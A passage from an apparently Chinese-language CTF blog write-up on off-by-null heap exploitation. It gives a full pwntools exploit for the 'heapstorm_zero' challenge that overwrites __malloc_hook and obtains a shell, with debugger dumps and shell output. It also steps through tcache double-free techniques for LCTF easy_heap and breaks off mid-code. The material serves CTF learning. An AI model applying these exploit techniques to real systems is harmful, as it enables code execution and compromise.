class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">from utils import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"></span><br><span class="line">path = &quot;./heapstorm_zero&quot;</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=0)</span><br><span class="line">bin = ELF(path, checksec=False)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># result = (unsigned int)(a1 - 1) &lt;= 0x37;</span><br><span class="line">def add(size, con):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def triger_consolidate(pay=&apos;&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。</span><br><span class="line">    :param pay:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    if pay == &apos;&apos;:</span><br><span class="line">        p.sendline(&apos;1&apos; * 0x400)  # malloc_consolidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos;)  # 0</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line">add(0x38, &apos;x&apos;)  # 9</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)  # shrink chunk 前，配置好</span><br><span class="line">add(0x38, pay)  # 10</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 11  , 保留块， 防止和 top chunk 合并</span><br><span class="line"></span><br><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 合并后 形成 0x210 大小的 smallbin</span><br><span class="line"># pwndbg&gt; x/4xg 0x555555757040</span><br><span class="line"># 0x555555757040: 0x0000000000000000      0x0000000000000211</span><br><span class="line"># 0x555555757050: 0x00002aaaab097d78      0x00002aaaab097d78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line">add(0x38, &apos;x&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line"></span><br><span class="line"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 触发 overlap</span><br><span class="line">dele(11)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"># 此时会有 指针交叉</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line"></span><br><span class="line">###  再次 shrink chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line"></span><br><span class="line">view(4)</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;lbase: &apos; + hex(lbase))</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 让 heap 回到 shrink chunk 后的情况</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">32: 0x0</span><br><span class="line">48: 0x0</span><br><span class="line">64: 0x0</span><br><span class="line">80: 0x0</span><br><span class="line">96: 0x0</span><br><span class="line">112: 0x0</span><br><span class="line">128: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/4xg 0x603040</span><br><span class="line">0x603040:       0x6161616161616161      0x0000000000000201</span><br><span class="line">0x603050:       0x00002aaaab097d68      0x00002aaaab097d68</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">add(0x18, &apos;A&apos; * 0x10)  # 1</span><br><span class="line">add(0x28, &apos;B&apos; * 0x20)  # 2</span><br><span class="line">add(0x38, &apos;C&apos; * 0x30)  # 3</span><br><span class="line">add(0x18, &apos;D&apos; * 0x10)  # 9</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x41)</span><br><span class="line">add(0x18, pay)  # 6</span><br><span class="line">add(0x28, &apos;asd&apos;)</span><br><span class="line">add(0x38, &apos;zxc&apos;)  # 5,c</span><br><span class="line">add(0x28, &apos;qqq&apos;)  # 6,d</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a1&apos;)  # 14</span><br><span class="line">add(0x28, &apos;a2&apos;)  # 15</span><br><span class="line"></span><br><span class="line"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span><br><span class="line"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span><br><span class="line">dele(5)</span><br><span class="line">dele(14)</span><br><span class="line">dele(0xc)</span><br><span class="line"></span><br><span class="line">dele(6)</span><br><span class="line">dele(15)</span><br><span class="line">dele(0xd)</span><br><span class="line"></span><br><span class="line">add(0x28, p64(0x41))</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line"></span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8))</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))</span><br><span class="line">add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把 unsorted bin 分配掉</span><br><span class="line">add(0x18, &apos;a&apos; * 0x18)</span><br><span class="line"></span><br><span class="line"># 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hook</span><br><span class="line">add(0x18, p64(lbase + 0xf02a4) * 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span><br><span class="line"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span><br><span class="line">dele(6)</span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure><h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p><p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p><p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p><p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p><p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p><p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p><p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p><p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p><p>下面新建 3 个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p><p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p><p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p><h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p><p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p><p><img alt="" data-src="/imgs/off-by-null-11.png" class="lozad"></p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin .</p><p>每个 tcache 最多 7 个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。</p><p>首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局为</p><p><img alt="" data-src="/imgs/off-by-null-12.png" class="lozad"></p><p>接下来利用 off by null 构造 overlap chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C .</li><li>然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。</li><li>然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</li><li>然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B</li></ul><p><img alt="" data-src="/imgs/off-by-null-13.png" class="lozad"></p><p>下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 把剩下的 tcache 里面的 bin 消耗掉</span><br><span class="line">for i in range(7):</span><br><span class="line">    malloc(8, &apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span><br><span class="line">malloc(1, &apos;8&apos;)</span><br></pre></td></tr></table></figure><p>首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。</p><p>然后打印 chunk 1 的内容，拿到 libc 的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure></p><p>下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># 为了给后续申请腾出空间</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。</li><li>然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A .</li></ul><p><img alt="" data-src="/imgs/off-by-null-14.png" class="lozad"></p><p>然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span 